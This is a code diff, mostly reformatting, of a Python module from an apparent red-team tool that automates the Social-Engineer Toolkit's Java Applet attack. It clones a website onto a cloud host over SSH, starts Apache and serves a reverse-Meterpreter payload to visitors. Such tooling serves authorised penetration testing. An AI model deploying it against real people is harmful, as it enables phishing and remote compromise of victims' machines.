@@ -1,10 +1,8 @@
 #!/usr/bin/env python
-# Default Java Applet Injection setup and automation 
+# Default Java Applet Injection setup and automation
 
-import sys
 import src.core.config
 import src.lib.fabfunky as fabfunky
-import src.lib.ec2funky as ec2funky
 import src.modules.setweb.autoset as autoset
 from src.modules.setweb.fabsetweb import set_auto
 import src.core.menus as menus
@@ -21,72 +19,73 @@ __maintainer__ = 'David Bressler (@bostonlink), GuidePoint Security LLC'
 __email__ = 'david.bressler@guidepointsecurity.com'
 __status__ = 'Development'
 
+
 def java_applet(idic, user, sshkey):
 
-	# Parse the config file and unpack user options from autoset menu
-	config = src.core.config.get_config()
+    # Parse the config file and unpack user options from autoset menu
+    config = src.core.config.get_config()
 
-	web_clone = menus.autoset_file_menu()
-	print green("\nCreating custom SET automation file...")
-	autofile = autoset.java_applet(idic["ip"], web_clone)
-	print green("Custom SET automation file created.\n")
+    web_clone = menus.autoset_file_menu()
+    print green("\nCreating custom SET automation file...")
+    autofile = autoset.java_applet(idic["ip"], web_clone)
+    print green("Custom SET automation file created.\n")
 
-	while True:
-		try:
-			sleep(2)
-			print yellow("Attempting to establish a connection to %s" % idic["ip"])
-			fabfunky.conn_est(idic["ip"], user, sshkey)
-			break
-		except Exception:
-			print red("Instance is still initializing...")
-			pass
+    while True:
+        try:
+            sleep(2)
+            print yellow("Attempting to establish a connection to %s" % idic["ip"])
+            fabfunky.conn_est(idic["ip"], user, sshkey)
+            break
+        except Exception:
+            print red("Instance is still initializing...")
+            pass
 
-	apache_status = apache_conf(config["set_config"])
-		
-	if apache_status == 'ON':
+    apache_status = apache_conf(config["set_config"])
 
-		if user == 'root':
-			rfile = '/%s/set_config' % user
-		else:
-			rfile = '/home/%s/set_config' % user
+    if apache_status == 'ON':
 
-		#uploads local SET config file
-		fabfunky.file_upload(idic["ip"], user, config["set_config"], rfile, sshkey)
-		fabfunky.move(idic["ip"], user, rfile, "/usr/share/set/config/", sshkey)
-			
-		print green("\nStarting Apache....")
-		fabfunky.apache_start(idic["ip"], user, sshkey)
-		print green("Apache Started...")
+        if user == 'root':
+            rfile = '/%s/set_config' % user
+        else:
+            rfile = '/home/%s/set_config' % user
 
-	else:
-		pass
+        #uploads local SET config file
+        fabfunky.file_upload(idic["ip"], user, config["set_config"], rfile, sshkey)
+        fabfunky.move(idic["ip"], user, rfile, "/usr/share/set/config/", sshkey)
 
-	interactive = menus.inter_shell_menu()
+        print green("\nStarting Apache....")
+        fabfunky.apache_start(idic["ip"], user, sshkey)
+        print green("Apache Started...")
 
-	if interactive == False:
+    else:
+        pass
 
-		print green("\nLaunching SET...")
-		set_auto(idic["ip"], user, autofile, sshkey)
-		print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]
+    interactive = menus.inter_shell_menu()
 
-	elif interactive == True:
-			
-		print green("\nLaunching SET...")
-		screen = set_auto(idic["ip"], user, autofile, sshkey)
-		print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]
+    if interactive is False:
 
-		screen = screen.strip().split()
-		sleep(2)
-		if '.SET' in screen[5]:
-			print screen[5]
-			cmd = 'sudo screen -r %s' % screen[5]
-			print red("\nDropping into a SSH shell....")
-			print green("SET Launched Java Applet (PyInjector)..... browse to http://%s to test") % idic["ip"]
-			print yellow("\nRemember if you want to disconnect from the screen session hit CTRL+A+D to detatch and exit...\n")
-			sleep(2)
-			fabfunky.interactive_shell(idic["ip"], user, cmd, sshkey)
-		else:
-			cmd = None
-			print red("\nDropping into a SSH shell....\n")
-			print red("No screen session returned.")
-			fabfunky.interactive_shell(idic["ip"], user, cmd, sshkey)
+        print green("\nLaunching SET...")
+        set_auto(idic["ip"], user, autofile, sshkey)
+        print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]
+
+    elif interactive is True:
+
+        print green("\nLaunching SET...")
+        screen = set_auto(idic["ip"], user, autofile, sshkey)
+        print green("\nSET Launched Java Applet (Reverse Meterpreter x86)..... browse to http://%s to test") % idic["ip"]
+
+        screen = screen.strip().split()
+        sleep(2)
+        if '.SET' in screen[5]:
+            print screen[5]
+            cmd = 'sudo screen -r %s' % screen[5]
+            print red("\nDropping into a SSH shell....")
+            print green("SET Launched Java Applet (PyInjector)..... browse to http://%s to test") % idic["ip"]
+            print yellow("\nRemember if you want to disconnect from the screen session hit CTRL+A+D to detatch and exit...\n")
+            sleep(2)
+            fabfunky.interactive_shell(idic["ip"], user, cmd, sshkey)
+        else:
+            cmd = None
+            print red("\nDropping into a SSH shell....\n")
+            print red("No screen session returned.")
+            fabfunky.interactive_shell(idic["ip"], user, cmd, sshkey)
